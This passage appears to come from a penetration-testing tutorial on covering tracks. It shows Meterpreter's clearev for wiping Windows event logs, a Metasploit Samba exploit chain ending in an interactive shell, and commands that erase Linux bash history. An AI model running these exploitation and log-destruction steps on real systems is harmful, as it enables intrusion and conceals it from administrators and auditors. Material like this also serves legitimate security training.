```

**Clearing tracks on Windows**

Whenever you successfully gain access to a Windows target, all of your activity is being logged in the form of Windows events. Meterpreter provides you with the ability to clear the entire Windows Event log. 

```shell
clearev
```

<br>

### 10.2. Clearing Your Tracks on Linux

Clearing tracks on a target machine is a critical step in penetration testing to ensure that the activities conducted during the test do not leave any evidence that could be detected later. In this lesson, we will learn about the process of clearing your tracks on a Linux system.

**Gain access to the system**

```shell
# Before we can begin, we will need to gain access to the target system. To begin with, we will need to identify a vulnerable service running on the target system. 
ping -c 1 <target_IP>
nmap -sV <target_IP>
service postgresql start && msfconsole
use exploit/linux/samba/is_known_pipename
set RHOSTS <target_IP>
exploit
/bin/bash -i
```

**Clearing tracks on Linux**

```shell
# Whenever you successfully gain access to a Linux target, all of your activity is being logged in the form of bash history. 
history -c

# We can also clear the bash history by deleting the content of the .bash_history file.
cat /dev/null > ~/.bash_history
```
